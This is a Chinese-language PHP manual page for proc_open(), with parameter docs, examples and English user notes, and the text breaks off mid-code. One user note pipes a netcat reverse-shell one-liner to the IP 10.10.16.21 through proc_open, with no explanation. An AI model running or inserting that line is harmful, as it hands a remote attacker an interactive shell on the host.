<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
 <head>
  <meta http-equiv="content-type" content="text/html; CHARSET=UTF-8">
  <title>执行一个命令，并且打开用来输入/输出的文件指针。</title>
<link media="all" rel="stylesheet" type="text/css" href="styles/03e73060321a0a848018724a6c83de7f-theme-base.css" />
<link media="all" rel="stylesheet" type="text/css" href="styles/03e73060321a0a848018724a6c83de7f-theme-medium.css" />

  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <link media="all" rel="stylesheet" type="text/css" href="style.css"/>
 </head>
 <body class="docs" class="docs"><div class="navbar navbar-fixed-top">
  <div class="navbar-inner clearfix">
    <ul class="nav" style="width: 100%">
      <li style="float: left;"><a href="function.proc-nice.html">? proc_nice</a></li>
      <li style="float: right;"><a href="function.proc-terminate.html">proc_terminate ?</a></li>
    </ul>
  </div>
</div>
<div id="breadcrumbs" class="clearfix">
  <ul class="breadcrumbs-container">
    <li><a href="index.html">PHP Manual</a></li>
    <li><a href="ref.exec.html">程序执行函数</a></li>
    <li>执行一个命令，并且打开用来输入/输出的文件指针。</li>
  </ul>
</div>
<div id="layout">
  <div id="layout-content"><div id="function.proc-open" class="refentry">
   <div class="refnamediv">
    <h1 class="refname">proc_open</h1>
    <p class="verinfo">(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</p><p class="refpurpose"><span class="refname">proc_open</span> &mdash; <span class="dc-title">
     执行一个命令，并且打开用来输入/输出的文件指针。
    </span></p>

   </div>
   <div class="refsect1 description" id="refsect1-function.proc-open-description">
    <h3 class="title">说明</h3>
     <div class="methodsynopsis dc-description">
   <span class="methodname"><strong>proc_open</strong></span>(<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="methodparam"><span class="type"><span class="type">array</span>|<span class="type">string</span></span> <code class="parameter">$command</code></span>,<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="methodparam"><span class="type">array</span> <code class="parameter">$descriptor_spec</code></span>,<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="methodparam"><span class="type">array</span> <code class="parameter reference">&$pipes</code></span>,<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="methodparam"><span class="type">?</span><span class="type"><span class="type">string</span><span class="type"></span></span> <code class="parameter">$cwd</code><span class="initializer"> = <strong><code>null</code></strong></span></span>,<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="methodparam"><span class="type">?</span><span class="type"><span class="type">array</span><span class="type"></span></span> <code class="parameter">$env_vars</code><span class="initializer"> = <strong><code>null</code></strong></span></span>,<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="methodparam"><span class="type">?</span><span class="type"><span class="type">array</span><span class="type"></span></span> <code class="parameter">$options</code><span class="initializer"> = <strong><code>null</code></strong></span></span><br>): <span class="type"><span class="type">resource</span>|<span class="type"><span class="type false">false</span></span></span></div>

    <p class="para rdfs-comment">
     类似 <span class="function"><a href="function.popen.html" class="function">popen()</a></span> 函数，
     但是 <span class="function"><strong>proc_open()</strong></span> 提供了更加强大的控制程序执行的能力。
    </p>



   </div>


 <div class="refsect1 parameters" id="refsect1-function.proc-open-parameters">
  <h3 class="title">参数</h3>
  <p class="para">
   <dl>
    
     <dt>
<code class="parameter">command</code></dt>

     <dd>

      <p class="para">
       以 <span class="type">string</span> 形式执行的命令行。特殊字符必须经过转义，并且使用正确的引号。
      </p>
      <blockquote class="note"><p><strong class="note">Note</strong>: 
       <span class="simpara">
        在 <em class="emphasis">Windows</em> 上, 除非在 <code class="parameter">options</code> 中
        把 <code class="literal">bypass_shell</code> 设置为  <strong><code>true</code></strong>
        ，否则 <code class="parameter">command</code> 会被传递给 <strong class="command">cmd.exe</strong> （实际上是 <code class="literal">%ComSpec%</code>）
        其中的 <code class="literal">/c</code> 标志是 <em class="emphasis">未加引号的</em> 字符串 （也就是和 <span class="function"><strong>proc_open()</strong></span> 一样）。
        这可能会导致 <strong class="command">cmd.exe</strong> 删除 <code class="parameter">command</code> 中的引号 （详见 <strong class="command">cmd.exe</strong> 文档），
        从而导致意外的，甚至是潜在的危险行为，因为
        <strong class="command">cmd.exe</strong> 错误消息可能包含 （部分） 传递的 <code class="parameter">command</code> （见下面的例子）。
       </span>
      </p></blockquote>
      <p class="para">
       从 PHP 7.4.0 开始，<code class="parameter">command</code> 参数可以使用 <span class="type">array</span> 类型传递。
       在这种情况下，进程将直接打开（不通过 shell ）。
       而 PHP 会处理任何必要的参数转义。
      </p>
      <blockquote class="note"><p><strong class="note">Note</strong>: 
       <p class="para">
        在 Windows 上， <span class="type">array</span> 元素的参数转义假定
        执行命令的命令行解析与 VC 运行时进行的命令行参数解析兼容。
       </p>
      </p></blockquote>
     </dd>

    
    
     <dt>
<code class="parameter">descriptor_spec</code></dt>

     <dd>

      <p class="para">
        一个索引数组。
        数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。
        0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。
      </p>
      <p class="para">
       数组中的元素可以是：
       <ul class="simplelist">
        <li class="member">   
         包含了要传送至进程的管道的描述信息的数组。第一个元素为描述符类型，第二个元素是针对该描述符的选项。有效的类型有：<code class="literal">pipe</code>（第二个元素可以是：<code class="literal">r</code>
         向进程传送该管道的读取端，<code class="literal">w</code> 向进程传送该管道的写入端），以及
         <code class="literal">file</code>（第二个元素为文件名）。注意除了 <code class="literal">w</code>
         之外的任何内容都视为 <code class="literal">r</code>。
        </li>
        <li class="member">
          流资源表示真实文件描述符（例如：已打开的文件，套接字，<strong><code>STDIN</code></strong>）。
        </li>
       </ul>
      </p>
      <p class="para">
        文件描述符的值不限于 0，1 和 2，你可以使用任何有效的文件描述符
        并将其传送至子进程。
        这使得你的脚本可以和其他脚本交互操作。
        例如，可以通过指定文件描述符将密码以更加安全的方式
        传送至诸如 PGP，GPG 和 openssl 程序，
        同时也可以很方便的获取这些程序的状态信息。
      </p>
     </dd>

    
    
     <dt>
<code class="parameter">pipes</code></dt>

     <dd>

      <p class="para">
        将被置为索引数组，
        其中的元素是被执行程序创建的管道对应到 PHP 这一端的文件指针。
      </p>
     </dd>

    
    
     <dt>
<code class="parameter">cwd</code></dt>

     <dd>

      <p class="para">
        要执行命令的初始工作目录。
        必须是 <em class="emphasis">绝对</em> 路径，
        设置此参数为 <strong><code>null</code></strong> 
        表示使用默认值（当前 PHP 进程的工作目录）。
      </p>
     </dd>

    
    
     <dt>
<code class="parameter">env_vars</code></dt>

     <dd>

      <p class="para">
        要执行的命令所使用的环境变量。
        设置此参数为 <strong><code>null</code></strong> 表示使用和当前 PHP 进程相同的环境变量。
      </p>
     </dd>

    
    
     <dt>
<code class="parameter">options</code></dt>

     <dd>

      <p class="para">
        你还可以指定一些附加选项。
        目前支持的选项包括：
       <ul class="simplelist">
        <li class="member">
         <code class="literal">suppress_errors</code> （仅用于 Windows 平台）：
         设置为 <strong><code>true</code></strong> 表示抑制本函数产生的错误。
        </li>
        <li class="member">
         <code class="literal">bypass_shell</code> （仅用于 Windows 平台）：
         设置为 <strong><code>true</code></strong> 表示绕过 <code class="literal">cmd.exe</code> shell。
        </li>
        <li class="member">
         <code class="literal">blocking_pipes</code> （仅用于 Windows 平台）：
         设置为 <strong><code>true</code></strong> 表示强制堵塞管道。
        </li>
        <li class="member">
         <code class="literal">create_process_group</code> （仅用于 Windows 平台）：
         设置为 <strong><code>true</code></strong> 表示允许子进程处理 <code class="literal">CTRL</code> 事件。
        </li>
        <li class="member">
         <code class="literal">create_new_console</code> （仅用于 Windows 平台）：
         表示新进程有一个新的控制台，用于代替父进程的控制台。
        </li>
       </ul>
      </p>
     </dd>

    
   </dl>

  </p>
 </div>


 <div class="refsect1 returnvalues" id="refsect1-function.proc-open-returnvalues">
  <h3 class="title">返回值</h3>
  <p class="para">
    返回表示进程的资源类型，
    当使用完毕之后，请调用 <span class="function"><a href="function.proc-close.html" class="function">proc_close()</a></span> 函数来关闭此资源。
    如果失败，返回 <strong><code>false</code></strong>。
  </p>
 </div>


 <div class="refsect1 changelog" id="refsect1-function.proc-open-changelog">
  <h3 class="title">更新日志</h3>
  <p class="para">
   <table class="doctable informaltable">
    
     <thead>
      <tr>
       <th>版本</th>
       <th>说明</th>
      </tr>

     </thead>

     <tbody class="tbody">
      <tr>
       <td>7.4.4</td>
       <td>
        为 <code class="parameter">options</code> 参数增加 <code class="literal">create_new_console</code> 选项。
       </td>
      </tr>

      <tr>
       <td>7.4.0</td>
       <td>
        <span class="function"><strong>proc_open()</strong></span> 的 <code class="parameter">command</code> 参数现在也允许数组类型。
       </td>
      </tr>

      <tr>
       <td>7.4.0</td>
       <td>
        为 <code class="parameter">options</code> 参数增加 <code class="literal">create_process_group</code> 选项。
       </td>
      </tr>

     </tbody>
    
   </table>

  </p>
 </div>


 <div class="refsect1 examples" id="refsect1-function.proc-open-examples">
  <h3 class="title">示例</h3>
  <p class="para">
   <div class="example" id="">
    <p><strong>Example #1 <span class="function"><strong>proc_open()</strong></span> 示例</strong></p>
    <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />$descriptorspec </span><span style="color: #007700">= array(<br />   </span><span style="color: #0000BB">0 </span><span style="color: #007700">=&gt; array(</span><span style="color: #DD0000">"pipe"</span><span style="color: #007700">, </span><span style="color: #DD0000">"r"</span><span style="color: #007700">),  </span><span style="color: #FF8000">// 标准输入，子进程从此管道中读取数据<br />   </span><span style="color: #0000BB">1 </span><span style="color: #007700">=&gt; array(</span><span style="color: #DD0000">"pipe"</span><span style="color: #007700">, </span><span style="color: #DD0000">"w"</span><span style="color: #007700">),  </span><span style="color: #FF8000">// 标准输出，子进程向此管道中写入数据<br />   </span><span style="color: #0000BB">2 </span><span style="color: #007700">=&gt; array(</span><span style="color: #DD0000">"file"</span><span style="color: #007700">, </span><span style="color: #DD0000">"/tmp/error-output.txt"</span><span style="color: #007700">, </span><span style="color: #DD0000">"a"</span><span style="color: #007700">) </span><span style="color: #FF8000">// 标准错误，写入到一个文件<br /></span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$cwd </span><span style="color: #007700">= </span><span style="color: #DD0000">'/tmp'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$env </span><span style="color: #007700">= array(</span><span style="color: #DD0000">'some_option' </span><span style="color: #007700">=&gt; </span><span style="color: #DD0000">'aeiou'</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$process </span><span style="color: #007700">= </span><span style="color: #0000BB">proc_open</span><span style="color: #007700">(</span><span style="color: #DD0000">'php'</span><span style="color: #007700">, </span><span style="color: #0000BB">$descriptorspec</span><span style="color: #007700">, </span><span style="color: #0000BB">$pipes</span><span style="color: #007700">, </span><span style="color: #0000BB">$cwd</span><span style="color: #007700">, </span><span style="color: #0000BB">$env</span><span style="color: #007700">);<br /><br />if (</span><span style="color: #0000BB">is_resource</span><span style="color: #007700">(</span><span style="color: #0000BB">$process</span><span style="color: #007700">)) {<br />    </span><span style="color: #FF8000">// $pipes 现在看起来是这样的：<br />    // 0 =&gt; 可以向子进程标准输入写入的句柄<br />    // 1 =&gt; 可以从子进程标准输出读取的句柄<br />    // 错误输出将被追加到文件 /tmp/error-output.txt<br /><br />    </span><span style="color: #0000BB">fwrite</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">0</span><span style="color: #007700">], </span><span style="color: #DD0000">'&lt;?php print_r($_ENV); ?&gt;'</span><span style="color: #007700">);<br />    </span><span style="color: #0000BB">fclose</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">0</span><span style="color: #007700">]);<br /><br />    echo </span><span style="color: #0000BB">stream_get_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">1</span><span style="color: #007700">]);<br />    </span><span style="color: #0000BB">fclose</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">1</span><span style="color: #007700">]);<br />    <br /><br />    </span><span style="color: #FF8000">// 切记：在调用 proc_close 之前关闭所有的管道以避免死锁。<br />    </span><span style="color: #0000BB">$return_value </span><span style="color: #007700">= </span><span style="color: #0000BB">proc_close</span><span style="color: #007700">(</span><span style="color: #0000BB">$process</span><span style="color: #007700">);<br /><br />    echo </span><span style="color: #DD0000">"command returned </span><span style="color: #0000BB">$return_value</span><span style="color: #DD0000">\n"</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
    </div>

    <div class="example-contents"><p>以上示例的输出类似于：</p></div>
    <div class="example-contents screen">
<div class="cdata"><pre>
Array
(
    [some_option] =&gt; aeiou
    [PWD] =&gt; /tmp
    [SHLVL] =&gt; 1
    [_] =&gt; /usr/local/bin/php
)
command returned 0
</pre></div>
    </div>
   </div>
  </p>

  <p class="para">
   <div class="example" id="">
    <p><strong>Example #2 <span class="function"><strong>proc_open()</strong></span> 在 Windows 上的怪异行为</strong></p>
    <div class="example-contents"><p>
     虽然人们可能期望下面的程序能够搜索文件
     <var class="filename">filename.txt</var> 进行文本搜索，
     并打印结果，但它的行为相当不同。
    </p></div>
    <div class="example-contents">
     <div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />$descriptorspec </span><span style="color: #007700">= [</span><span style="color: #0000BB">STDIN</span><span style="color: #007700">, </span><span style="color: #0000BB">STDOUT</span><span style="color: #007700">, </span><span style="color: #0000BB">STDOUT</span><span style="color: #007700">];<br /></span><span style="color: #0000BB">$cmd </span><span style="color: #007700">= </span><span style="color: #DD0000">'"findstr" "search" "filename.txt"'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$proc </span><span style="color: #007700">= </span><span style="color: #0000BB">proc_open</span><span style="color: #007700">(</span><span style="color: #0000BB">$cmd</span><span style="color: #007700">, </span><span style="color: #0000BB">$descriptorspec</span><span style="color: #007700">, </span><span style="color: #0000BB">$pipes</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">proc_close</span><span style="color: #007700">(</span><span style="color: #0000BB">$proc</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
    </div>

    <div class="example-contents"><p>以上示例会输出：</p></div>
    <div class="example-contents screen">
     <div class="cdata"><pre>
&#039;findstr&quot; &quot;search&quot; &quot;filename.txt&#039; is not recognized as an internal or external command,
operable program or batch file.
</pre></div>
    </div>
    <div class="example-contents"><p>
     要解决该行为，通常只需将 <code class="parameter">command</code> 加上引号：
    </p></div>
    <div class="example-contents">
     <div class="phpcode"><code><span style="color: #000000">
$cmd = '""findstr" "search" "filename.txt""';</span>
</code></div>
    </div>

   </div>
  </p>



 </div>


 <div class="refsect1 notes" id="refsect1-function.proc-open-notes">
  <h3 class="title">注释</h3>
  <blockquote class="note"><p><strong class="note">Note</strong>: 
   <p class="para">
    Windows 兼容性：超过 2 的描述符也可以作为可继承的句柄传送到子进程。
    但是，由于 Windows 的架构并不将文件描述符和底层句柄进行关联，
    所以，子进程无法访问这样的句柄。
    标准输入，标准输出和标注错误会按照预期工作。
   </p>
  </p></blockquote>
  <blockquote class="note"><p><strong class="note">Note</strong>: 
   <p class="para">
    如果你只需要单向的进程管道，
    使用 <span class="function"><a href="function.popen.html" class="function">popen()</a></span> 函数会更加简单。
   </p>
  </p></blockquote>
 </div>

 
 <div class="refsect1 seealso" id="refsect1-function.proc-open-seealso">
  <h3 class="title">参见</h3>
  <p class="para">
   <ul class="simplelist">
    <li class="member"><span class="function"><a href="function.popen.html" class="function" rel="rdfs-seeAlso">popen()</a> - 打开进程文件指针</span></li>
    <li class="member"><span class="function"><a href="function.exec.html" class="function" rel="rdfs-seeAlso">exec()</a> - 执行一个外部程序</span></li>
    <li class="member"><span class="function"><a href="function.system.html" class="function" rel="rdfs-seeAlso">system()</a> - 执行外部程序，并且显示输出</span></li>
    <li class="member"><span class="function"><a href="function.passthru.html" class="function" rel="rdfs-seeAlso">passthru()</a> - 执行外部程序并且显示原始输出</span></li>
    <li class="member"><span class="function"><a href="function.stream-select.html" class="function" rel="rdfs-seeAlso">stream_select()</a> - Runs the equivalent of the select() system call on the given
   arrays of streams with a timeout specified by seconds and microseconds</span></li>
    <li class="member">The <a href="language.operators.execution.html" class="link">执行运算符</a></li>
   </ul>
  </p>
 </div>

</div><div id="usernotes">
 <div class="head">
  <h3 class="title">User Contributed Notes</h3>
 </div>
<div id="allnotes">  <a name="128449""></a>
  <div class="note">
   <strong class="user">Gil Potts</strong>
   <a href="#128449" class="date">04-May-2023 03:58</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
This is not really a bug but more of an unexpected gotcha.&nbsp; If you pass in an array for $env and include a modified PATH, that path does not take effect in PHP itself when starting the process.&nbsp; So if you are trying to start an executable in the modified PATH by using just the executable name, PHP and the OS won't find it and therefore will fail to start the process.<br />
<br />
The fix is to let PHP know about the modified PATH by calling putenv("PATH=" . $newpath) with the new path string so that the call to proc_open() will correctly locate the executable and successfully run it.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="128252""></a>
  <div class="note">
   <strong class="user">Bobby Dylan</strong>
   <a href="#128252" class="date">25-Feb-2023 06:32</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I'm not sure when the "blocking_pipes (windows only)" option was added to PHP, but users of this function should be fully aware that there is no such thing as a non-blocking pipe in PHP on Windows and that the "blocking_pipes" option does NOT function like you might expect.&nbsp; Passing "blocking_pipes" =&gt; false does NOT mean non-blocking pipes.<br />
<br />
PHP uses anonymous pipes to start processes on Windows.&nbsp; The Windows CreatePipe() function does not directly support overlapped I/O (aka asynchronous), which is typically how async/non-blocking I/O happens on Windows.&nbsp; SetNamedPipeHandleState() has an option called PIPE_NOWAIT but Microsoft has long discouraged the use of that option.&nbsp; PHP does not use PIPE_NOWAIT anywhere in the source code tree.&nbsp; PHP FastCGI startup code is the only place within the PHP source code that uses overlapped I/O (and also the only place that calls SetNamedPipeHandleState() with PIPE_WAIT).&nbsp; Further, stream_set_blocking() on Windows is only implemented for sockets - not file handles or pipes.&nbsp; That is, calling stream_set_blocking() on pipe handles returned by proc_open() will actually do nothing on Windows.&nbsp; We can derive from these facts that PHP does not have a non-blocking implementation for pipes on Windows and will therefore block/deadlock when using proc_open().<br />
<br />
PHP's pipe read implementation on Windows uses PeekNamedPipe() by polling on the pipe until there is some data available to read OR until ~32 seconds (3200000 * 10 microseconds of sleep) have passed before giving up, whichever comes first.&nbsp; The "blocking_pipes" option, when set to true, changes that behavior to wait indefinitely (i.e. always block) until there is data on the pipe.&nbsp; It's better to view the "blocking_pipes" option as a "possibly 32 second busy wait" timeout (false - the default value) vs. no timeout (true).&nbsp; In either case, the boolean value for this option effectively blocks...it just happens to block a lot longer when set to true.<br />
<br />
The undocumented string "socket" descriptor type can be passed to proc_open() and PHP will start a temporary TCP/IP server and generate a pre-connected TCP/IP socket pair for the pipe and pass one socket to the target process and return the other as the associated pipe.&nbsp; However, passing a socket handle for stdout/stderr on Windows causes the last chunk(s) of output to occasionally get lost and not be delivered to the receiving end.&nbsp; This is actually a known bug in Windows itself and Microsoft's response at one point was that CreateProcess() only officially supports anonymous pipes and file handles for the standard handles (i.e. not named pipes or socket handles) and that other handle types will produce "undefined behavior."&nbsp; For sockets, it will "sometimes work fine and sometimes truncate the output."&nbsp; The "socket" descriptor type also introduces a race condition that is probably a security vulnerability in proc_open() where another process can successfully connect to the server side BEFORE the original process connects to the socket to create the socket pair.&nbsp; This allows a rogue application to send malformed data to a process, which could trigger anything from privilege escalation to SQL injection depending on what the application does with the information on stdout/stderr.<br />
<br />
To get true non-blocking I/O in PHP for Windows for standard process handles (i.e. stdin, stdout, stderr) without obscure bugs cropping up, the only currently working option is to use an intermediary process that uses TCP/IP blocking sockets to route data to blocking standard handles via multithreading (i.e. start three threads to route data between the TCP/IP socket and the standard HANDLE and use a temporary secret to prevent race conditions when establishing the TCP/IP socket handles).&nbsp; For those who lost count:&nbsp; That's one extra process, up to four extra threads, and up to four TCP/IP sockets just to get functionally correct non-blocking I/O for proc_open() on Windows.&nbsp; If you vomited a little bit at that idea/concept, well, people actually do this!&nbsp; Feel free to vomit some more.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="128029""></a>
  <div class="note">
   <strong class="user">anony mouse</strong>
   <a href="#128029" class="date">20-Dec-2022 07:25</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
<span class="default">&lt;?php<br />
$descriptorspec </span><span class="keyword">= array(<br />
&nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">),&nbsp; </span><span class="comment">// stdin is a pipe that the child will read from<br />
&nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">),&nbsp; </span><span class="comment">// stdout is a pipe that the child will write to<br />
&nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">"file"</span><span class="keyword">, </span><span class="string">"/tmp/error-output.txt"</span><span class="keyword">, </span><span class="string">"a"</span><span class="keyword">) </span><span class="comment">// stderr is a file to write to<br />
</span><span class="keyword">);<br />
</span><span class="default">$process </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="string">'sh'</span><span class="keyword">, </span><span class="default">$descriptorspec</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">, </span><span class="default">$cwd</span><span class="keyword">, </span><span class="default">$env</span><span class="keyword">);<br />
if (</span><span class="default">is_resource</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">)) {<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.21 6666 &gt;/tmp/f'</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="default">stream_get_contents</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$return_value </span><span class="keyword">= </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"command returned </span><span class="default">$return_value</span><span class="string">\n"</span><span class="keyword">;<br />
}<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="120608""></a>
  <div class="note">
   <strong class="user">weirdall at hotmail dot com</strong>
   <a href="#120608" class="date">07-Feb-2017 03:01</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
This script will tail a file using tail -F to follow scripts that are rotated.<br />
<br />
<span class="default">&lt;?php<br />
$descriptorspec </span><span class="keyword">= array(<br />
&nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">),&nbsp; </span><span class="comment">// stdin is a pipe that the child will read from<br />
&nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">),&nbsp; </span><span class="comment">// stdout is a pipe that the child will write to<br />
&nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">)&nbsp;&nbsp; </span><span class="comment">// stderr is a pipe that stdout will to write to<br />
</span><span class="keyword">);<br />
<br />
</span><span class="default">$filename </span><span class="keyword">= </span><span class="string">'/var/log/nginx/nginx-access.log'</span><span class="keyword">;<br />
if( !</span><span class="default">file_exists</span><span class="keyword">( </span><span class="default">$filename </span><span class="keyword">) ) {<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">file_put_contents</span><span class="keyword">(</span><span class="default">$filename</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">);<br />
}<br />
</span><span class="default">$process </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="string">'tail -F /var/log/nginx/stats.bluebillywig.com-access.log'</span><span class="keyword">, </span><span class="default">$descriptorspec</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">);<br />
<br />
if (</span><span class="default">is_resource</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">)) {<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment">// $pipes now looks like this:<br />
&nbsp;&nbsp;&nbsp; // 0 =&gt; writeable handle connected to child stdin<br />
&nbsp;&nbsp;&nbsp; // 1 =&gt; readable handle connected to child stdout<br />
&nbsp;&nbsp;&nbsp; // Any error output will be sent to $pipes[2]<br />
<br />
&nbsp;&nbsp;&nbsp; // Closing $pipes[0] because we don't need it<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">( </span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">] );<br />
<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment">// stderr should not block, because that blocks the tail process<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">stream_set_blocking</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">], </span><span class="default">0</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$count</span><span class="keyword">=</span><span class="default">0</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$stream </span><span class="keyword">= </span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">];<br />
<br />
&nbsp;&nbsp;&nbsp; while ( (</span><span class="default">$buf </span><span class="keyword">= </span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$stream</span><span class="keyword">,</span><span class="default">4096</span><span class="keyword">)) ) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">print_r</span><span class="keyword">(</span><span class="default">$buf</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Read stderr to see if anything goes wrong<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$stderr </span><span class="keyword">= </span><span class="default">fread</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">], </span><span class="default">4096</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if( !empty( </span><span class="default">$stderr </span><span class="keyword">) ) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; print( </span><span class="string">'log: ' </span><span class="keyword">. </span><span class="default">$stderr </span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">]);<br />
<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment">// It is important that you close any pipes before calling<br />
&nbsp;&nbsp;&nbsp; // proc_close in order to avoid a deadlock<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">);<br />
}<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="119134""></a>
  <div class="note">
   <strong class="user">stoller at leonex dot de</strong>
   <a href="#119134" class="date">08-Apr-2016 07:37</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you are working on Windows and try to proc_open an executable that contains spaces in its path, you will get into trouble.<br />
<br />
But there's a workaround which works quite well. I have found it here: <a href="http://stackoverflow.com/a/4410389/1119601" rel="nofollow" target="_blank">http://stackoverflow.com/a/4410389/1119601</a><br />
<br />
For example, if you want to execute "C:\Program Files\nodejs\node.exe", you will get the error that the command could not be found.<br />
Try this:<br />
<span class="default">&lt;?php<br />
$cmd </span><span class="keyword">= </span><span class="string">'C:\\Program Files\\nodejs\\node.exe'</span><span class="keyword">;<br />
if (</span><span class="default">strtolower</span><span class="keyword">(</span><span class="default">substr</span><span class="keyword">(</span><span class="default">PHP_OS</span><span class="keyword">,</span><span class="default">0</span><span class="keyword">,</span><span class="default">3</span><span class="keyword">)) === </span><span class="string">'win'</span><span class="keyword">) {<br />
